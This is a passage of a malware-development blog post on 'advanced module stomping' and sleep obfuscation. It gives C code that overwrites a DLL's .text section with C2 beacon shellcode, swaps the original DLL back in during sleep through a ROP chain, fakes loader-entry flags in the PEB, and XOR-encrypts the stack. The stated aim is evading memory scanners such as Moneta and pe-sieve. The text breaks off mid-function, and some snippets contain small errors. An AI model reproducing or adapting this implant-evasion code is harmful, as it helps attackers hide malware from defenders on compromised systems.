# https://oblivion-malware.xyz/posts/advanced-module-stomping-heap-stack-enc/

<!DOCTYPE html><html lang="en"><body><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Evading detection in memory - Pt 2: Improving Module Stomping (Advanced Module Stomping) + Sleep Obfuscation with heap/stack encryption</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p>As mentioned in the previous blog post <a href="https://oblivion-malware.xyz/posts/sleep-obf-foliage/">Evading detection in memory - Pt 1: Sleep Obfuscation - Foliage</a>, memory detections focus on private <code class="language-plaintext highlighter-rouge">RX</code> memory regions and the thread’s call stack.</p><p>The <strong>Module Stomping</strong> technique involves overwriting the <code class="language-plaintext highlighter-rouge">RX</code> (read-execute) memory region of a DLL loaded in memory with shellcode, with the goal of evading detection based on private memory analysis. This method also avoids concerns about the <em><code class="language-plaintext highlighter-rouge">call stack</code></em>, as the shellcode is executed from a memory region that is supported. However, a challenge with this process is that, when using sRDI (shellcode Reflection DLL Injection) C2 beacons, the memory content will be reflected into a new region, causing an overwrite of a legitimate DLL area. This results in visible modifications, which can be easily detected, generating <code class="language-plaintext highlighter-rouge">IOCs</code> (Indicators of Compromise).</p><p>The solution to this problem involves using a <strong>reflective loader</strong> in conjunction with the Implant, in my case, I’ll use a shellcode that doesn’t reflect. However, even with this approach, the overwritten memory area can still be perceptible. To enhance this technique and reduce the likelihood of detection, we propose the following process:</p><ol><li><strong>Allocate Mapped RW Memory</strong>: First, we allocate two <em>Mapped RW</em> memory regions, called <code class="language-plaintext highlighter-rouge">Memory Mapped A</code> and <code class="language-plaintext highlighter-rouge">Memory Mapped B</code>.</li><li><strong>Backup the DLL</strong>: We back up the DLL that will be overwritten by storing it in <code class="language-plaintext highlighter-rouge">Memory Mapped A</code>, for later preserve the integrity of the original DLL.</li><li><strong>Write the Beacon</strong>: The beacon (shellcode) is then written into <code class="language-plaintext highlighter-rouge">Memory Mapped B</code>, a secure memory area for the payload.</li><li><strong>Stomp the text section with shellcode Implant</strong>: We will load DLL using <a href="https://learn.microsoft.com/pt-br/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryEx</a> passing <code class="language-plaintext highlighter-rouge">DONT_RESOLVE_DLL_REFERENCES</code> and overwrite the text section of the module.</li><li><strong>Restore During “Sleep”</strong>: During the process’s “sleep” time (inactivity), the overwritten DLL is restored to its original position in memory from the backup in <code class="language-plaintext highlighter-rouge">Memory Mapped A</code>. This step ensures that while the beacon is inactive, the memory will appear legitimate, containing the original DLL data.</li><li><strong>Prepare for Execution</strong>: When it’s time to execute the beacon, the memory is overwritten again, and the beacon is loaded back into <code class="language-plaintext highlighter-rouge">Memory Mapped B</code>, replacing the restored DLL.</li></ol><p>In this way, the DLL’s memory will appear legitimate during the beacon’s inactivity period, with a very brief window of visibility only during the beacon’s execution. This minimizes the chances of detection, as the memory changes occur only during the active execution phase and are quickly reverted once the beacon has finished executing.</p><h1 id="injection-stomping">Injection: Stomping</h1><p>We will have a structure to store values to pass to our agent, containing information about the <code class="language-plaintext highlighter-rouge">MAPPED</code> memory for agent backup and the backup of the Stomped Module.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_STOMP_ARGS</span> <span class="p">{</span>
    <span class="n">PVOID</span>  <span class="n">AgntBackup</span><span class="p">;</span>
    <span class="n">PVOID</span>  <span class="n">ModBackup</span><span class="p">;</span>
<span class="p">}</span> <span class="n">STOMP_AGRS</span><span class="p">,</span> <span class="o">*</span><span class="n">PSTOMP_ARGS</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><p>(In the injection code responsible for loading the DLL, we will start with a simple POC, loading the DLL “<strong>chakra.dll</strong>”, …) In the injection code, we will start with a simple POC by loading a DLL called <strong>chakra.dll</strong>, first, we will load it using the API <a href="https://learn.microsoft.com/pt-br/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryEx</a> passing <strong>DONT_RESOLVE_DLL_REFERENCES</strong></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>    <span class="n">MmBase</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">LoadLibraryExA</span><span class="p">(</span> <span class="s">"chakra.dll"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">DONT_RESOLVE_DLL_REFERENCES</span> <span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div><p>This way, the <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain">DllMain entrypoint</a> of the DLL is not called, and it also does not resolve the IAT, as otherwise the loaded DLL could load other DLLs and start other threads, which we do not want while performing Module Stomping. The standard use of <a href="https://learn.microsoft.com/pt-br/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryEx</a> is problematic for several reasons that we will discuss later.</p><p>We will parse the DLL header to find its .text section.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>    <span class="n">SecHdr</span> <span class="o">=</span> <span class="n">IMAGE_FIRST_SECTION</span><span class="p">(</span> <span class="n">Header</span> <span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">ULONG</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">Header</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">strcmp</span><span class="p">(</span> <span class="n">C_PTR</span><span class="p">(</span> <span class="n">SecHdr</span><span class="p">[</span> <span class="n">i</span> <span class="p">].</span><span class="n">Name</span> <span class="p">),</span> <span class="s">".text"</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>        
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">MmBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">UINT64</span><span class="p">)(</span><span class="n">MmBase</span><span class="p">)</span> <span class="o">+</span> <span class="n">SecHdr</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><p>Now, we will create backups of the Agent and the Module using <code class="language-plaintext highlighter-rouge">MAPPED</code> memory.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>    <span class="n">hFile</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">CreateFileMappingA</span><span class="p">(</span> 
        <span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> 
        <span class="nb">NULL</span><span class="p">,</span> <span class="n">StompArgs</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="nb">NULL</span> 
    <span class="p">);</span>

    <span class="n">StompArgs</span><span class="p">.</span><span class="n">Backup</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">MapViewOfFile</span><span class="p">(</span> 
        <span class="n">hFile</span><span class="p">,</span> <span class="n">FILE_MAP_WRITE</span> <span class="o">|</span> <span class="n">FILE_MAP_READ</span><span class="p">,</span> 
        <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">StompArgs</span><span class="p">.</span><span class="n">Length</span> 
    <span class="p">);</span>

    <span class="n">StompArgs</span><span class="p">.</span><span class="n">Backup2</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">MapViewOfFile</span><span class="p">(</span> 
        <span class="n">hFile</span><span class="p">,</span> <span class="n">FILE_MAP_WRITE</span> <span class="o">|</span> <span class="n">FILE_MAP_READ</span><span class="p">,</span> 
        <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">StompArgs</span><span class="p">.</span><span class="n">Length</span> 
    <span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div><p>After changing the protection to <code class="language-plaintext highlighter-rouge">RW</code>, we will populate the agent backup and write our shellcode to the <code class="language-plaintext highlighter-rouge">.text</code> section, then revert to the previous protection, and finally call ShellcodeMain, passing the structure as an argument.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>    <span class="n">Instance</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">VirtualProtect</span><span class="p">(</span> <span class="n">MmBase</span><span class="p">,</span> <span class="n">SecHdr</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Protect</span> <span class="p">);</span>
    
    <span class="n">MmCopy</span><span class="p">(</span> <span class="n">StompArgs</span><span class="p">.</span><span class="n">ModBackup</span><span class="p">,</span> <span class="n">MmBase</span><span class="p">,</span> <span class="n">ShellcodeSize</span> <span class="p">);</span>
    <span class="n">MmCopy</span><span class="p">(</span> <span class="n">MmBase</span><span class="p">,</span> <span class="n">ShellcodeBuffer</span><span class="p">,</span> <span class="n">ShellcodeSize</span> <span class="p">);</span>

    <span class="n">MmZero</span><span class="p">(</span> <span class="n">ShellcodeBuffer</span><span class="p">,</span> <span class="n">ShellcodeSize</span> <span class="p">);</span> <span class="c1">// this depends on the shellcode location</span>

    <span class="n">bCheck</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">VirtualProtect</span><span class="p">(</span> <span class="n">MmBase</span><span class="p">,</span> <span class="n">SecHdr</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="n">Protect</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Protect</span> <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">bCheck</span> <span class="p">)</span> <span class="k">return</span><span class="p">;</span>
    
    <span class="n">Instance</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">BlackoutMain</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">StompArgs</span> <span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div><h1 id="agent-sleepobf--stomping">Agent: SleepObf + Stomping</h1><p>We will start the sleep obfuscation chain by changing the RX area’s address to <code class="language-plaintext highlighter-rouge">RW</code>, then writing with the module’s backup, reverting to <code class="language-plaintext highlighter-rouge">RX</code>, and then sleeping:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>    <span class="n">RopProtRx</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Gadget</span><span class="p">;</span> <span class="c1">//jmp rbx gadget</span>
    <span class="n">RopProtRw</span><span class="p">.</span><span class="n">Rbx</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">VirtualProtect</span><span class="p">;</span>
    <span class="n">RopProtRw</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Base</span><span class="p">.</span><span class="n">RxBase</span><span class="p">;</span>
    <span class="n">RopProtRw</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Base</span><span class="p">.</span><span class="n">RxBase</span><span class="p">;</span>
    <span class="n">RopProtRw</span><span class="p">.</span><span class="n">R8</span>  <span class="o">=</span> <span class="n">PAGE_READWRITE</span><span class="p">;</span>
    <span class="n">RopProtRw</span><span class="p">.</span><span class="n">R9</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">OldProt</span><span class="p">;</span>

    <span class="n">RopModBcp</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">WriteProcessMemory</span><span class="p">;</span>
    <span class="n">RopModBcp</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">NtCurrentProcess</span><span class="p">();</span> 
    <span class="n">RopModBcp</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Base</span><span class="p">.</span><span class="n">Buffer</span><span class="p">;</span>
    <span class="n">RopModBcp</span><span class="p">.</span><span class="n">R8</span>  <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">StompArgs</span><span class="o">-&gt;</span><span class="n">ModBackup</span><span class="p">;</span>
    <span class="n">RopModBcp</span><span class="p">.</span><span class="n">R9</span>  <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Base</span><span class="p">.</span><span class="n">FullLen</span><span class="p">;</span>

    <span class="n">RopProtRx</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Gadget</span><span class="p">;</span> <span class="c1">//jmp rbx gadget</span>
    <span class="n">RopProtRx</span><span class="p">.</span><span class="n">Rbx</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">VirtualProtect</span><span class="p">;</span>
    <span class="n">RopProtRx</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Base</span><span class="p">.</span><span class="n">Buffer</span><span class="p">;</span>
    <span class="n">RopProtRx</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Base</span><span class="p">.</span><span class="n">FullLen</span><span class="p">;</span>
    <span class="n">RopProtRx</span><span class="p">.</span><span class="n">R8</span>  <span class="o">=</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">;</span>
    <span class="n">RopProtRx</span><span class="p">.</span><span class="n">R9</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">OldProt</span><span class="p">;</span>

    <span class="n">RopDelay</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">WaitForSingleObjectEx</span><span class="p">;</span>
    <span class="n">RopDelay</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">NtCurrentProcess</span><span class="p">();</span>
    <span class="n">RopDelay</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">SleepTime</span><span class="p">;</span>
    <span class="n">RopDelay</span><span class="p">.</span><span class="n">R8</span>  <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><p>Now let’s observe that the <code class="language-plaintext highlighter-rouge">call stack</code> appears legitimate.</p><p></p><p>Perspective from <a href="https://github.com/hasherezade/pe-sieve">pe-sieve</a></p><p></p><p>Note: The interesting part is that if we don’t revert the module’s memory back to <code class="language-plaintext highlighter-rouge">RX</code> and leave it as <code class="language-plaintext highlighter-rouge">RW</code>, Moneta doesn’t detect it. However, this isn’t a recommended approach.</p><p>Perspective from <a href="https://github.com/forrest-orr/moneta">moneta</a> about not reverting memory to RX</p><p>warning: “unsigned module” is just because my .exe is not signed with a certificate.</p><p></p><p>Perspective from <a href="https://github.com/forrest-orr/moneta">moneta</a> about reverting memory to RX:</p><p></p><p>We encounter issues with <strong>Shareable Working Set</strong> and <strong>SharedOriginal</strong>. I was alerted to this after reading a blog post by Nigerald and your can see his blog post <a href="https://dtsec.us/">here</a>, which can be found in the last section of this blog post under “<strong>Reference and credits</strong>”. He explains them as follows:</p><ul><li><code class="language-plaintext highlighter-rouge">Shared Working Set</code> is the number of bytes of memory that this particular page is using and is shared. To avoid wasting memory, some of it is shared. For example, <code class="language-plaintext highlighter-rouge">ntdll</code> is loaded into all processes and uses the same physical memory. If this shared memory is written to, the process gets a private copy of the memory page, using additional physical memory.</li><li><code class="language-plaintext highlighter-rouge">SharedOriginal</code> is a flag of a memory page that indicates whether this page is the original mapping. This flag is set to 0 when the page is written to, meaning it would be a copy of the original page, but modified.</li></ul><p>Moneta flagged this due to these flags, so I developed a POC (Proof of Concept) to circumvent this. The idea is as follows:</p><ol><li>First, we allocate just one <em>Mapped RW</em> memory region for implant backup.</li><li>Write to memory to create a backup of the implant content.</li><li>During Sleep Obfuscation, we unload the loaded module and load a fresh instance of the same module without the corrupted image pages.</li><li>Upon waking, restore the implant to the <code class="language-plaintext highlighter-rouge">.text</code> section and resume execution.</li></ol><p>In this POC, I won’t go into detail about the injector as I believe it’s clear how to adapt it. Moving directly to the implant, we will proceed with:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>    <span class="n">RopFreeLb</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">LdrUnloadDll</span><span class="p">;</span>
    <span class="n">RopFreeLb</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">hLibraryFr</span><span class="p">;</span>

    <span class="n">RopLoadLb</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">LoadLibraryExA</span><span class="p">;</span>
    <span class="n">RopLoadLb</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">LibraryFr</span><span class="p">;</span>
    <span class="n">RopLoadLb</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">RopLoadLb</span><span class="p">.</span><span class="n">R8</span>  <span class="o">=</span> <span class="n">DONT_RESOLVE_DLL_REFERENCES</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><p>These are the first two fragments of the chain, but we still have the issue with <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryExA</a>, which is a bit worse in this implementation. Now it’s time to fix this and explain more about its problems.</p><p>When a module is loaded with the <code class="language-plaintext highlighter-rouge">DONT_RESOLVE_DLL_REFERENCES</code> flag within the <code class="language-plaintext highlighter-rouge">LDR_DATA_TABLE_ENTRY</code> located inside the LDR, some of its values are abnormal, as can be seen below:</p><p></p><p>This image was taken from the blog post by BRC4 Release: Nightmare, which can be found in the “References and Credits” section. According to him, the values represent the following:</p><ul><li><code class="language-plaintext highlighter-rouge">EntryPoint</code>: The entry point for the module’s execution, where the <code class="language-plaintext highlighter-rouge">DllMain</code> address would be located.</li><li><code class="language-plaintext highlighter-rouge">ImageDLL</code>: This means the DLL was loaded as an EXE rather than as a DLL.</li><li><code class="language-plaintext highlighter-rouge">LoadNotificationsSent</code>: This indicates that the loading notification for the DLL was not sent.</li><li><code class="language-plaintext highlighter-rouge">ProcessStaticImport</code>: This means the DLL’s imports were not processed.</li></ul><p>I will create a simple piece of code to compare a DLL loaded with <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a> and compare it with a DLL loaded using <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryExA</a> with the <code class="language-plaintext highlighter-rouge">DONT_RESOLVE_DLL_REFERENCES</code> flag. The result is shown below:</p><p></p><p>Note: When I examined other modules, and even the DLL loaded “normally,” the <code class="language-plaintext highlighter-rouge">ProcessStaticImport</code> member was marked as <code class="language-plaintext highlighter-rouge">false</code>, so I kept it as <code class="language-plaintext highlighter-rouge">false</code> in this case.</p><p>To fix this in the PEB, we have the following example code:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>    <span class="n">PLDR_DATA_TABLE_ENTRY</span> <span class="n">Data</span>   <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">PLIST_ENTRY</span>           <span class="n">Head</span>   <span class="o">=</span> <span class="o">&amp;</span><span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Teb</span><span class="o">-&gt;</span><span class="n">ProcessEnvironmentBlock</span><span class="o">-&gt;</span><span class="n">Ldr</span><span class="o">-&gt;</span><span class="n">InLoadOrderModuleList</span><span class="p">;</span>
    <span class="n">PLIST_ENTRY</span>           <span class="n">Entry</span>  <span class="o">=</span> <span class="n">Head</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span>
    <span class="n">PIMAGE_NT_HEADERS</span>     <span class="n">NtHdrs</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">UINT64</span>                <span class="n">Ep</span>     <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HMODULE</span>               <span class="n">Module</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span> <span class="p">;</span> <span class="n">Head</span> <span class="o">!=</span> <span class="n">Entry</span> <span class="p">;</span> <span class="n">Entry</span> <span class="o">=</span> <span class="n">Entry</span><span class="o">-&gt;</span><span class="n">Flink</span> <span class="p">)</span> <span class="p">{</span>
        <span class="n">Data</span> <span class="o">=</span> <span class="n">C_PTR</span><span class="p">(</span> <span class="n">Entry</span> <span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span> <span class="n">strcmp</span><span class="p">(</span> <span class="n">Data</span><span class="o">-&gt;</span><span class="n">BaseDllName</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">ModuleName</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
            <span class="n">Module</span> <span class="o">=</span> <span class="n">Data</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
     <span class="p">}</span>

    <span class="n">NtHdrs</span> <span class="o">=</span> <span class="p">(</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)(</span> <span class="n">Module</span> <span class="p">)</span> <span class="o">+</span> <span class="p">(</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)(</span> <span class="n">Module</span> <span class="p">)</span> <span class="p">)</span><span class="o">-&gt;</span><span class="n">e_lfanew</span> <span class="p">);</span>
    <span class="n">Ep</span>     <span class="o">=</span> <span class="n">Module</span> <span class="o">+</span> <span class="n">NtHdrs</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>
    
    <span class="n">Data</span><span class="o">-&gt;</span><span class="n">EntryPoint</span> <span class="o">=</span> <span class="n">Ep</span><span class="p">;</span>
    <span class="n">Data</span><span class="o">-&gt;</span><span class="n">Flags</span>      <span class="o">=</span> <span class="mh">0x8a2cc</span><span class="p">;</span>
    <span class="n">Data</span><span class="o">-&gt;</span><span class="n">ImageDll</span>   <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">Data</span><span class="o">-&gt;</span><span class="n">LoadNotificationsSent</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">Data</span><span class="o">-&gt;</span><span class="n">ProcessStaticImport</span>   <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><p>We retrieve the module’s address, then parse it to obtain the <code class="language-plaintext highlighter-rouge">AddressOfEntryPoint</code> and pass it to <code class="language-plaintext highlighter-rouge">PLDR_DATA_TABLE_ENTRY-&gt;EntryPoint</code>. The other values will be set according to the screenshot above.</p><p>This time we will even add <a href="https://github.com/thefLink/Hunt-Sleeping-Beacons">Hunting Sleep Beacons</a>, below we have our advanced module stomping vs memory scanners.</p><p>Moneta:</p><p></p><p>pe-sieve:</p><p></p><p>Hunting Sleep Beacons:</p><p></p><h1 id="heapstack-encryption---plus">Heap/Stack Encryption - Plus</h1><p>An important step in sleep obfuscation is to encrypt both the <code class="language-plaintext highlighter-rouge">stack</code> and the <code class="language-plaintext highlighter-rouge">heap</code>. Many pieces of information such as variables, function return addresses, etc., are stored in these areas at runtime.</p><h2 id="stack"><span class="me-2">Stack</span><a href="https://oblivion-malware.xyz/posts/advanced-module-stomping-heap-stack-enc/#stack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To obfuscate the stack, we need its base address and size. For this, we can use the <code class="language-plaintext highlighter-rouge">TEB-&gt;NT_TIB.StackBase</code> and <code class="language-plaintext highlighter-rouge">TEB-&gt;NT_TIB.StackLimit</code> values. Once we have the base address and size, we can pass them to an encryption/obfuscation function.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>    <span class="n">PTEB</span> <span class="n">Teb</span> <span class="o">=</span> <span class="n">NtCurrentTeb</span><span class="p">();</span>
    <span class="n">PVOID</span>  <span class="n">StackBase</span>  <span class="o">=</span> <span class="n">Teb</span><span class="o">-&gt;</span><span class="n">NtTib</span><span class="p">.</span><span class="n">StackBase</span><span class="p">;</span>
    <span class="n">PVOID</span>  <span class="n">StackLimit</span> <span class="o">=</span> <span class="n">Teb</span><span class="o">-&gt;</span><span class="n">NtTib</span><span class="p">.</span><span class="n">StackLimit</span><span class="p">;</span>

    <span class="n">XorStack</span><span class="p">(</span> <span class="n">StackBase</span><span class="p">,</span> <span class="n">StackSize</span> <span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div><p>using this function to obf:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">FUNC</span> <span class="n">VOID</span> <span class="nf">XorStack</span><span class="p">(</span>
